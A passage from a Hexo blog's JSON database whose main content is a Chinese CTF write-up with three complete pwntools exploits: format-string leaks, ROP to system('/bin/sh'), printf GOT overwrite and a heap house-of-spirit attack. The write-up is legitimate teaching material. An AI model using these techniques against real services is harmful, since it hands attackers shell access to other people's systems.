0dc73c33ec48927fc2521a54","modified":1485861441057},{"_id":"themes/yilia/source-src/js/util.js","hash":"8456e9d6b19532742582c99b2fb9d09e146e1c58","modified":1485861441057},{"_id":"themes/yilia/source-src/js/viewer.js","hash":"808a2e1ed407984cfdc929b827d3638f70ec9a2a","modified":1485861441057},{"_id":"source/_posts/2017HCTF赛后整理/7.png","hash":"1a6cf1d19e59581639e91270d2570ab89ed11ef1","modified":1512298735000},{"_id":"source/_posts/LIEF部分中文文档/2.png","hash":"39526a870bef77a0620d28975e89ef5518f52673","modified":1513161953000},{"_id":"source/_posts/LIEF部分中文文档/hashme.png","hash":"70f89d7dfa04b71bd1659f34ca4dda8abb456a79","modified":1513076506000},{"_id":"themes/yilia/.git/objects/pack/pack-d2b27a77179f1e5f0279d3fb17609ad7080ff731.idx","hash":"d4ec772addde074ee25af50ed6767b6c4e3682a6","modified":1485861440633},{"_id":"themes/yilia/.git/refs/heads/master","hash":"16c9033891e94fe5e58ea0af0d925519a76eb2c1","modified":1485861441021},{"_id":"themes/yilia/layout/_partial/post/category.ejs","hash":"c2dccf1a95ec09ceeee5004293ac7edb7e1c9a66","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/date.ejs","hash":"ef71c4081e866a494367575c59610e7e6339ece0","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/duoshuo.ejs","hash":"e8399025ed3b980aedb821c92855889f5f12fd5b","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/nav.ejs","hash":"1036c8e4e1a7bc935ba173744da735a0d6ed09cd","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/share.ejs","hash":"341103df70d0b476e3acd0afbc507a4a120d8f5f","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/tag.ejs","hash":"2e783e68755abb852760eb0e627a3fbb50a05a55","modified":1485861441049},{"_id":"themes/yilia/layout/_partial/post/title.ejs","hash":"2f275739b6f1193c123646a5a31f37d48644c667","modified":1485861441049},{"_id":"themes/yilia/source/img/wechat.jpg","hash":"261e31d9bfc1462b5bd955b423cab397b89a03dc","modified":1486572195000},{"_id":"themes/yilia/source-src/css/core/_animation.scss","hash":"63a37f26276f9207405afe0f2d65339ce295bbaf","modified":1485861441053},{"_id":"themes/yilia/source-src/css/core/_media-queries.scss","hash":"491ab3378d5c11005ba65c607608bb36b368a9d5","modified":1485861441053},{"_id":"themes/yilia/source-src/css/core/_mixin.scss","hash":"3bba5c77bad5981eac859fe05c9561d580ba7fa9","modified":1485861441053},{"_id":"themes/yilia/source-src/css/core/_reset.scss","hash":"fab871fa93bd542e76a71a56428f2994a4aaf443","modified":1485861441053},{"_id":"themes/yilia/source-src/css/core/_variables.scss","hash":"fb511c505d1309249f21dc577d4ad2bad99a764f","modified":1485861441053},{"_id":"themes/yilia/source-src/css/fonts/iconfont.eot","hash":"b7f28dc802d6e32281e8fe7930d4dd2022d00717","modified":1485861441053},{"_id":"themes/yilia/source-src/css/fonts/iconfont.svg","hash":"3313bf984fbee56b022942a5d19c916b4734fd60","modified":1485861441053},{"_id":"themes/yilia/source-src/css/fonts/iconfont.ttf","hash":"697449e7790edd12e208706ecaa8d5d0eed44cde","modified":1485861441053},{"_id":"themes/yilia/source-src/css/fonts/iconfont.woff","hash":"cda0ea1dc25dc3d329d7637afe2cd6aec37e351b","modified":1485861441053},{"_id":"themes/yilia/source-src/css/img/checkered-pattern.png","hash":"049262fa0886989d750637b264bed34ab51c23c8","modified":1485861441053},{"_id":"themes/yilia/source-src/css/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1485861441053},{"_id":"themes/yilia/source-src/css/img/tooltip.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1485861441053},{"_id":"source/_posts/Metasploit-learning/m.png","hash":"0bc917ff198c80f535244ede2f20c438d8206a1c","modified":1494317007000},{"_id":"source/_posts/LIEF部分中文文档/3.png","hash":"72c13e474c543f059bc614ae9c56f53b7f953b6c","modified":1513164725000},{"_id":"source/_posts/LIEF部分中文文档/4.png","hash":"62a3fd30f0cbe564d5795bd7abf02a746d93437a","modified":1513164745000},{"_id":"source/_posts/LIEF部分中文文档/5.png","hash":"968eebc67e189e65783124be565ac46476ec13e7","modified":1513164755000},{"_id":"themes/yilia/.git/logs/refs/heads/master","hash":"11842bb7b676ecb091f99d70fab9bb3e32f7c2e6","modified":1485861441021},{"_id":"themes/yilia/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1485861441021},{"_id":"source/_posts/AlexCTF-writeup/1.png","hash":"0cd1a1a6c0e4c8224dff0e1fccf7168634cf962e","modified":1487334899000},{"_id":"themes/yilia/.git/logs/refs/remotes/origin/HEAD","hash":"11842bb7b676ecb091f99d70fab9bb3e32f7c2e6","modified":1485861441021},{"_id":"source/_posts/glibc-heap导图/heap.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1494764372000},{"_id":"themes/yilia/.git/objects/pack/pack-d2b27a77179f1e5f0279d3fb17609ad7080ff731.pack","hash":"3d7322b63689c3b44983672a60b0dbf0874976bc","modified":1485861440633}],"Category":[],"Data":[],"Page":[{"title":"categories","date":"2017-02-02T18:12:40.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2017-02-03 02:12:40\ntype: \"categories\"\ncomments: false\n---\n","updated":"2017-02-02T18:13:42.447Z","path":"categories/index.html","layout":"page","_id":"cjcpz0jwk0001hv18m1k97jbl","content":"","excerpt":"","more":""},{"title":"Photo","layout":"post","slug":"instragrm","nodate":true,"_content":"\n","source":"instagram/index.md","raw":"---\ntitle: Photo\nlayout: post\nslug: \"instragrm\"\nnodate: true\n---\n\n","date":"2017-02-05T15:19:15.578Z","updated":"2017-02-05T15:19:15.554Z","path":"instagram/index.html","comments":1,"_id":"cjcpz0jwq0003hv18a92ejnlt","content":"","excerpt":"","more":""},{"title":"All Tags","date":"2017-02-02T16:51:41.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: All Tags\ndate: 2017-02-03 00:51:41\ntype: \"tags\"\ncomments: false\n---\n","updated":"2017-02-02T17:31:37.800Z","path":"tags/index.html","layout":"page","_id":"cjcpz0jx20006hv18k64ri05a","content":"","excerpt":"","more":""}],"Post":[{"title":"2017.4.8Pwn","date":"2017-04-10T23:28:28.000Z","_content":"\n## 前言\n\n简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。\n\n## ropprintf\n\n两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以`%7$lx`才会打印出栈上的数据；同时`x`与`lx`的区别，分别是4byte与8byte长度。相同的还有`n`这个格式化符号，`n`是写到对应内存的4个byte里，`ln`是写到对应内存的8byte里。\n\n然后还要注意，不同机器上的libc可能不一样，同时大多数都是以`0`对齐的，所以可能需要猜一猜。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])\nif local:\n    p = process('./ropprintf')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote('172.16.1.1', 20000)\n    libc = ELF('./libc.so.6')\n\n#if local and debug:\n#    gdb.attach(p, open('debug'))\n\nelf = ELF('./ropprintf')\n\noffset = 22\n\nprintf_got = elf.got['printf']\n\npayload1 = '%11$lx'\npop_ret = 0x0000000000400703 # pop rdi, ret\np.recvuntil('something\\n')\ngdb.attach(p)\np.sendline(payload1)\nlibc_start_main_addr = int(p.recvline(), 16)\nprint 'libc_start => ', hex(libc_start_main_addr)\n\nlibc.address = libc_start_main_addr - 240 - libc.symbols['__libc_start_main']\nsystem_addr = libc.symbols['system']\nprint 'system_addr => ', hex(system_addr)\nbinsh_addr = libc.search('/bin/sh').next()\n\nfor i in range(8):\n    p.recvuntil('something\\n')\n    p.sendline('1')\n# gdb.attach(p)\npayload2 = 'a' * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\n## easyprintf\n\n最直接的fsb。程序开了`PIE`，可以通过直接打印得到`elf.address`和`libc.address`。由于传参方式不一样，所以能用传统的方式去写，这里我是用的`UAF`，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的`hhn`和`hn`分字节去修改。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug', terminal = ['tmux','splitw', '-h'])\nif local:\n    p = process('./easyprintf')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p)\n\nelf = ELF('./easyprintf')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n# leak libc_base & elf_base\npayload1 = '%9$lx-%38$lx'\np.recvuntil('something\\n')\n# gdb.attach(p)\np.sendline(payload1)\naddr = p.recvline()[:-1].split('-')\nlibc.address = int(addr[0], 16) - 0x18ba47\nelf.address = int(addr[1], 16) - 0x8d0\nprint 'elf_base => ', hex(elf.address)\nprint 'libc_address => ', hex(libc.address)\nsystem_addr = libc.symbols['system']\nbinsh_addr = libc.search('/bin/sh').next()\nprint 'system_addr => ', hex(system_addr)\nprint 'binsh_addr => ', hex(binsh_addr)\nprintf_addr = hex(libc.symbols['printf'])\nprint 'printf_addr => ', printf_addr\n\n# UAF\nprintf_got = elf.got['printf']\nprint 'printf_got => ', hex(printf_got)\n# gdb.attach(p)\npayload2 = 'a' * (0x100 - 0x10) + p64(printf_got + 0x2)  + p64(printf_got)\nprint payload2\np.recvuntil('something\\n')\n# gdb.attach(p)\np.sendline(payload2)\n\n# edit printf_got to system_addr\noffset = int(printf_addr[-6:-4], 16) - 1\nprint hex(offset)\noffset1 = int(hex(system_addr - libc.address)[4:], 16) + int(str(printf_addr)[-4] + '000', 16)\nprint hex(offset1)\n# gdb.attach(p)\npayload3 = '%{}x'.format(offset) + '%36$hhn'\npayload3 += '%{}x'.format(offset1 - offset) + '%37$hn'\n# payload3 = '%37$lx'\np.recvuntil('something\\n')\np.sendline(payload3)\n\n# getshell\np.recvuntil('something\\n')\np.sendline('/bin/sh\\x00')\np.interactive()\n```\n\n## book\n\n一个简单的堆的题目。由于程序在每次`add()`时候都会申请一个相应大小的`fastbin`和`smallbin`，释放时`fastbin`放到对应链表中，`smallbin`放到`unsortbin`链表中。其中`feedback()`没有检查堆的长度，修改可造成堆溢出。\n\n`feedback()`\n```\n_BYTE *feedback()\n{\n  _BYTE *result; // rax@7\n  unsigned int v1; // [sp+8h] [bp-8h]@1\n  unsigned int i; // [sp+Ch] [bp-4h]@1\n\n  v1 = 0;\n  for ( i = 0; (signed int)i <= 3; ++i )\n  {\n    if ( auther_name_array[5 * (signed int)i] && feedback_array[5 * (signed int)i] )\n      printf(\"feedback of book%d is %s\\n\", i, feedback_array[5 * (signed int)i]);\n  }\n  puts(\"Which book do you want to modify the feedback?\");\n  __isoc99_scanf(\"%d\", &v1);\n  result = (_BYTE *)v1;\n  if ( (v1 & 0x80000000) == 0 )\n  {\n    result = (_BYTE *)v1;\n    if ( (signed int)v1 <= 3 )\n    {\n      result = (_BYTE *)feedback_array[5 * (signed int)v1];\n      if ( result )\n        result = read_feadback(feedback_array[5 * (signed int)v1]);\n    }\n  }\n  return result;\n}\n```\n\n这个函数不仅会造成堆溢出，还可用来泄露一些地址。\n简单观察可以发现`fastbin`的链表可以通过堆溢出修改，也就是说我们可以使用`house_of_spirit`来分配得到一个指向bss段的chunk，然后修改`feedback_array[]`这个指针数组，并通过`feedback()`来泄露libc的地址。\n但是还要找到一个bss上的`0x10,0x20,0x30...`的数字才能构造，事实上bss上存有`feedback_length[]`这个数组，我们可以通过`UAF`去得到一个数字即可。\n\n`bss`段数据：\n```\n.bss:0000000000601D00 _bss            segment para public 'BSS' use64\n.bss:0000000000601D00                 assume cs:_bss\n.bss:0000000000601D00                 ;org 601D00h\n.bss:0000000000601D00                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing\n.bss:0000000000601D00                 public stdin\n.bss:0000000000601D00 ; FILE *stdin\n.bss:0000000000601D00 stdin           dq ?                    ; DATA XREF: main+17\u0018r\n.bss:0000000000601D00                                         ; Copy of shared data\n.bss:0000000000601D08                 align 10h\n.bss:0000000000601D10                 public stdout\n.bss:0000000000601D10 ; FILE *stdout\n.bss:0000000000601D10 stdout          dq ?                    ; DATA XREF: main+35\u0018r\n.bss:0000000000601D10                                         ; Copy of shared data\n.bss:0000000000601D18 byte_601D18     db ?                    ; DATA XREF: sub_400850+9\u0018r\n.bss:0000000000601D18                                         ; sub_400850:loc_4008A6\u0018w\n.bss:0000000000601D19                 align 20h\n.bss:0000000000601D20 qword_601D20    dq ?                    ; DATA XREF: sub_400850+17\u0018r\n.bss:0000000000601D20                                         ; sub_400850+3C\u0018w ...\n.bss:0000000000601D28                 align 20h\n.bss:0000000000601D40 ; int dword_601D40[]\n.bss:0000000000601D40 dword_601D40    dd ?                    ; DATA XREF: random+115\u0018r\n.bss:0000000000601D40                                         ; add+71\u0018w\n.bss:0000000000601D44                 align 8\n.bss:0000000000601D48 ; __int64 index_array[]\n.bss:0000000000601D48 index_array     dq ?                    ; DATA XREF: add+9A\u0018w\n.bss:0000000000601D48                                         ; exchange+C5\u0018r ...\n.bss:0000000000601D50 ; __int64 feedback_length[]\n.bss:0000000000601D50 feedback_length dq ?                    ; DATA XREF: add+19F\u0018w\n.bss:0000000000601D50                                         ; sub_400F67+BB\u0018r ...\n.bss:0000000000601D58 ; __int64 auther_name_array[]\n.bss:0000000000601D58 auther_name_array dq ?                  ; DATA XREF: add+D9\u0018w\n.bss:0000000000601D58                                         ; add+F7\u0018r ...\n.bss:0000000000601D60 ; __int64 feedback_array[]\n.bss:0000000000601D60 feedback_array  dq ?                    ; DATA XREF: random+F3\u0018r\n.bss:0000000000601D60                                         ; random+235\u0018r ...\n```\n\n所以我的思路如下：\n1. 通过一定的堆排布，是的`fastbin`在地址上连续，使得堆溢出可以修改相邻堆块的指针。\n2. 在堆排布的同时申请一个长度为`0x20`的feedback，使得`0x20`用来我们以后伪造`fastbin`并分配来用。\n3. 通过堆溢出修改相邻已经`free`了的`fastbin`，修改指针使其指向我们刚才已经伪造的bss上的地址。\n4. 修改`freeback_array[]`，使一个指针为`atoi_got`。\n5. 再次使用`feedback()`泄露`atoi`，并计算libc得到`system`，并修改`atoi_got`为`system`。\n6. getshell\n\nexp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug')#, terminal = ['tmux', 'splitw', '-h'])\nif local:\n    p = process('./book')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nbss = 0x0000000000601D00\nelf = ELF('./book')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\natoi_got = elf.got['atoi']\n\ndef add(author, length, feedback):\n    p.recvuntil('!!\\n')\n    p.sendline(str(2))\n    p.recvuntil('author:\\n')\n    p.sendline(author)\n    p.recvuntil('it?\\n')\n    p.sendline(str(length))\n    p.sendline(feedback)\n\ndef delete(index):\n    p.recvuntil('!!\\n')\n    p.sendline(str(3))\n    p.recvuntil('book?\\n')\n    p.sendline(str(index))\n\n\ndef feedback(index, feedback):\n    p.recvuntil('!!\\n')\n    p.sendline(str(4))\n    p.recvuntil('feedback?')\n    p.sendline(str(index))\n    p.sendline(feedback)\n\ndef pwn():\n# use UAF to exploit house_of_spirit \n# UAF\n    add(str(0), 0x30, 'a')\n    delete(0)\n    add(str(1), 0x20, 'b')\n    delete(0)\n    add(str(2), 0x10, 'c')\n    delete(0)\n    add(str(3), 0x20, 'd')  # index 0\n    payload = 'a' * 0x20 + p64(0) + p64(0x21) + p64(0x601d58 - 0x10)\n    feedback(0, payload)\n    add(str(4), 0x10, 'e')  # index 2\n#    gdb.attach(p)\n    add(str(5), 0x10, 'f' * 0x8 + p64(atoi_got)) # index 1\n\n# leak atoi_addr\n    p.recvuntil('!!\\n')\n    p.sendline('4')\n    p.recvuntil('is ')\n    atoi_addr = u64(p.recv(6) + '\\x00\\x00')\n#    gdb.attach(p)\n    p.recvline()\n    print 'atoi_addr => ', hex(atoi_addr)\n\n# edit atoi to system\n    libc.address = atoi_addr - libc.symbols['atoi']\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n    binsh_addr = libc.search('/bin/sh').next()\n    p.sendline('0')\n    p.sendline(p64(system_addr))\n#    gdb.attach(p)\n\n# getshell\n    p.recvuntil('!!\\n')\n    p.send('/bin/sh\\x00')\n    p.interactive()\n\nif __name__ == '__main__':\n    pwn()\n```","source":"_posts/2017-4-8Pwn-1.md","raw":"---\ntitle: 2017.4.8Pwn\ntags:\n  - PWN\ncategories: []\ndate: 2017-04-11 07:28:28\n---\n\n## 前言\n\n简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。\n\n## ropprintf\n\n两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以`%7$lx`才会打印出栈上的数据；同时`x`与`lx`的区别，分别是4byte与8byte长度。相同的还有`n`这个格式化符号，`n`是写到对应内存的4个byte里，`ln`是写到对应内存的8byte里。\n\n然后还要注意，不同机器上的libc可能不一样，同时大多数都是以`0`对齐的，所以可能需要猜一猜。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])\nif local:\n    p = process('./ropprintf')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote('172.16.1.1', 20000)\n    libc = ELF('./libc.so.6')\n\n#if local and debug:\n#    gdb.attach(p, open('debug'))\n\nelf = ELF('./ropprintf')\n\noffset = 22\n\nprintf_got = elf.got['printf']\n\npayload1 = '%11$lx'\npop_ret = 0x0000000000400703 # pop rdi, ret\np.recvuntil('something\\n')\ngdb.attach(p)\np.sendline(payload1)\nlibc_start_main_addr = int(p.recvline(), 16)\nprint 'libc_start => ', hex(libc_start_main_addr)\n\nlibc.address = libc_start_main_addr - 240 - libc.symbols['__libc_start_main']\nsystem_addr = libc.symbols['system']\nprint 'system_addr => ', hex(system_addr)\nbinsh_addr = libc.search('/bin/sh').next()\n\nfor i in range(8):\n    p.recvuntil('something\\n')\n    p.sendline('1')\n# gdb.attach(p)\npayload2 = 'a' * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\n## easyprintf\n\n最直接的fsb。程序开了`PIE`，可以通过直接打印得到`elf.address`和`libc.address`。由于传参方式不一样，所以能用传统的方式去写，这里我是用的`UAF`，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的`hhn`和`hn`分字节去修改。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug', terminal = ['tmux','splitw', '-h'])\nif local:\n    p = process('./easyprintf')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p)\n\nelf = ELF('./easyprintf')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n# leak libc_base & elf_base\npayload1 = '%9$lx-%38$lx'\np.recvuntil('something\\n')\n# gdb.attach(p)\np.sendline(payload1)\naddr = p.recvline()[:-1].split('-')\nlibc.address = int(addr[0], 16) - 0x18ba47\nelf.address = int(addr[1], 16) - 0x8d0\nprint 'elf_base => ', hex(elf.address)\nprint 'libc_address => ', hex(libc.address)\nsystem_addr = libc.symbols['system']\nbinsh_addr = libc.search('/bin/sh').next()\nprint 'system_addr => ', hex(system_addr)\nprint 'binsh_addr => ', hex(binsh_addr)\nprintf_addr = hex(libc.symbols['printf'])\nprint 'printf_addr => ', printf_addr\n\n# UAF\nprintf_got = elf.got['printf']\nprint 'printf_got => ', hex(printf_got)\n# gdb.attach(p)\npayload2 = 'a' * (0x100 - 0x10) + p64(printf_got + 0x2)  + p64(printf_got)\nprint payload2\np.recvuntil('something\\n')\n# gdb.attach(p)\np.sendline(payload2)\n\n# edit printf_got to system_addr\noffset = int(printf_addr[-6:-4], 16) - 1\nprint hex(offset)\noffset1 = int(hex(system_addr - libc.address)[4:], 16) + int(str(printf_addr)[-4] + '000', 16)\nprint hex(offset1)\n# gdb.attach(p)\npayload3 = '%{}x'.format(offset) + '%36$hhn'\npayload3 += '%{}x'.format(offset1 - offset) + '%37$hn'\n# payload3 = '%37$lx'\np.recvuntil('something\\n')\np.sendline(payload3)\n\n# getshell\np.recvuntil('something\\n')\np.sendline('/bin/sh\\x00')\np.interactive()\n```\n\n## book\n\n一个简单的堆的题目。由于程序在每次`add()`时候都会申请一个相应大小的`fastbin`和`smallbin`，释放时`fastbin`放到对应链表中，`smallbin`放到`unsortbin`链表中。其中`feedback()`没有检查堆的长度，修改可造成堆溢出。\n\n`feedback()`\n```\n_BYTE *feedback()\n{\n  _BYTE *result; // rax@7\n  unsigned int v1; // [sp+8h] [bp-8h]@1\n  unsigned int i; // [sp+Ch] [bp-4h]@1\n\n  v1 = 0;\n  for ( i = 0; (signed int)i <= 3; ++i )\n  {\n    if ( auther_name_array[5 * (signed int)i] && feedback_array[5 * (signed int)i] )\n      printf(\"feedback of book%d is %s\\n\", i, feedback_array[5 * (signed int)i]);\n  }\n  puts(\"Which book do you want to modify the feedback?\");\n  __isoc99_scanf(\"%d\", &v1);\n  result = (_BYTE *)v1;\n  if ( (v1 & 0x80000000) == 0 )\n  {\n    result = (_BYTE *)v1;\n    if ( (signed int)v1 <= 3 )\n    {\n      result = (_BYTE *)feedback_array[5 * (signed int)v1];\n      if ( result )\n        result = read_feadback(feedback_array[5 * (signed int)v1]);\n    }\n  }\n  return result;\n}\n```\n\n这个函数不仅会造成堆溢出，还可用来泄露一些地址。\n简单观察可以发现`fastbin`的链表可以通过堆溢出修改，也就是说我们可以使用`house_of_spirit`来分配得到一个指向bss段的chunk，然后修改`feedback_array[]`这个指针数组，并通过`feedback()`来泄露libc的地址。\n但是还要找到一个bss上的`0x10,0x20,0x30...`的数字才能构造，事实上bss上存有`feedback_length[]`这个数组，我们可以通过`UAF`去得到一个数字即可。\n\n`bss`段数据：\n```\n.bss:0000000000601D00 _bss            segment para public 'BSS' use64\n.bss:0000000000601D00                 assume cs:_bss\n.bss:0000000000601D00                 ;org 601D00h\n.bss:0000000000601D00                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing\n.bss:0000000000601D00                 public stdin\n.bss:0000000000601D00 ; FILE *stdin\n.bss:0000000000601D00 stdin           dq ?                    ; DATA XREF: main+17\u0018r\n.bss:0000000000601D00                                         ; Copy of shared data\n.bss:0000000000601D08                 align 10h\n.bss:0000000000601D10                 public stdout\n.bss:0000000000601D10 ; FILE *stdout\n.bss:0000000000601D10 stdout          dq ?                    ; DATA XREF: main+35\u0018r\n.bss:0000000000601D10                                         ; Copy of shared data\n.bss:0000000000601D18 byte_601D18     db ?                    ; DATA XREF: sub_400850+9\u0018r\n.bss:0000000000601D18                                         ; sub_400850:loc_4008A6\u0018w\n.bss:0000000000601D19                 align 20h\n.bss:0000000000601D20 qword_601D20    dq ?                    ; DATA XREF: sub_400850+17\u0018r\n.bss:0000000000601D20                                         ; sub_400850+3C\u0018w ...\n.bss:0000000000601D28                 align 20h\n.bss:0000000000601D40 ; int dword_601D40[]\n.bss:0000000000601D40 dword_601D40    dd ?                    ; DATA XREF: random+115\u0018r\n.bss:0000000000601D40                                         ; add+71\u0018w\n.bss:0000000000601D44                 align 8\n.bss:0000000000601D48 ; __int64 index_array[]\n.bss:0000000000601D48 index_array     dq ?                    ; DATA XREF: add+9A\u0018w\n.bss:0000000000601D48                                         ; exchange+C5\u0018r ...\n.bss:0000000000601D50 ; __int64 feedback_length[]\n.bss:0000000000601D50 feedback_length dq ?                    ; DATA XREF: add+19F\u0018w\n.bss:0000000000601D50                                         ; sub_400F67+BB\u0018r ...\n.bss:0000000000601D58 ; __int64 auther_name_array[]\n.bss:0000000000601D58 auther_name_array dq ?                  ; DATA XREF: add+D9\u0018w\n.bss:0000000000601D58                                         ; add+F7\u0018r ...\n.bss:0000000000601D60 ; __int64 feedback_array[]\n.bss:0000000000601D60 feedback_array  dq ?                    ; DATA XREF: random+F3\u0018r\n.bss:0000000000601D60                                         ; random+235\u0018r ...\n```\n\n所以我的思路如下：\n1. 通过一定的堆排布，是的`fastbin`在地址上连续，使得堆溢出可以修改相邻堆块的指针。\n2. 在堆排布的同时申请一个长度为`0x20`的feedback，使得`0x20`用来我们以后伪造`fastbin`并分配来用。\n3. 通过堆溢出修改相邻已经`free`了的`fastbin`，修改指针使其指向我们刚才已经伪造的bss上的地址。\n4. 修改`freeback_array[]`，使一个指针为`atoi_got`。\n5. 再次使用`feedback()`泄露`atoi`，并计算libc得到`system`，并修改`atoi_got`为`system`。\n6. getshell\n\nexp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 1\ndebug = 0\n\nif slog: context(log_level = 'debug')#, terminal = ['tmux', 'splitw', '-h'])\nif local:\n    p = process('./book')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nbss = 0x0000000000601D00\nelf = ELF('./book')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\natoi_got = elf.got['atoi']\n\ndef add(author, length, feedback):\n    p.recvuntil('!!\\n')\n    p.sendline(str(2))\n    p.recvuntil('author:\\n')\n    p.sendline(author)\n    p.recvuntil('it?\\n')\n    p.sendline(str(length))\n    p.sendline(feedback)\n\ndef delete(index):\n    p.recvuntil('!!\\n')\n    p.sendline(str(3))\n    p.recvuntil('book?\\n')\n    p.sendline(str(index))\n\n\ndef feedback(index, feedback):\n    p.recvuntil('!!\\n')\n    p.sendline(str(4))\n    p.recvuntil('feedback?')\n    p.sendline(str(index))\n    p.sendline(feedback)\n\ndef pwn():\n# use UAF to exploit house_of_spirit \n# UAF\n    add(str(0), 0x30, 'a')\n    delete(0)\n    add(str(1), 0x20, 'b')\n    delete(0)\n    add(str(2), 0x10, 'c')\n    delete(0)\n    add(str(3), 0x20, 'd')  # index 0\n    payload = 'a' * 0x20 + p64(0) + p64(0x21) + p64(0x601d58 - 0x10)\n    feedback(0, payload)\n    add(str(4), 0x10, 'e')  # index 2\n#    gdb.attach(p)\n    add(str(5), 0x10, 'f' * 0x8 + p64(atoi_got)) # index 1\n\n# leak atoi_addr\n    p.recvuntil('!!\\n')\n    p.sendline('4')\n    p.recvuntil('is ')\n    atoi_addr = u64(p.recv(6) + '\\x00\\x00')\n#    gdb.attach(p)\n    p.recvline()\n    print 'atoi_addr => ', hex(atoi_addr)\n\n# edit atoi to system\n    libc.address = atoi_addr - libc.symbols['atoi']\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n    binsh_addr = libc.search('/bin/sh').next()\n    p.sendline('0')\n    p.sendline(p64(system_addr))\n#    gdb.attach(p)\n\n# getshell\n    p.recvuntil('!!\\n')\n    p.send('/bin/sh\\x00')\n    p.interactive()\n\nif __name__ == '__main__':\n    pwn()\n```","slug":"2017-4-8Pwn-1","published":1,"updated":"2017-04-11T00:31:41.542Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jwe0000hv18x93imiar","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。</p>\n<h2 id=\"ropprintf\"><a href=\"#ropprintf\" class=\"headerlink\" title=\"ropprintf\"></a>ropprintf</h2><p>两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以<code>%7$lx</code>才会打印出栈上的数据；同时<code>x</code>与<code>lx</code>的区别，分别是4byte与8byte长度。相同的还有<code>n</code>这个格式化符号，<code>n</code>是写到对应内存的4个byte里，<code>ln</code>是写到对应内存的8byte里。</p>\n<p>然后还要注意，不同机器上的libc可能不一样，同时大多数都是以<code>0</code>对齐的，所以可能需要猜一猜。</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div 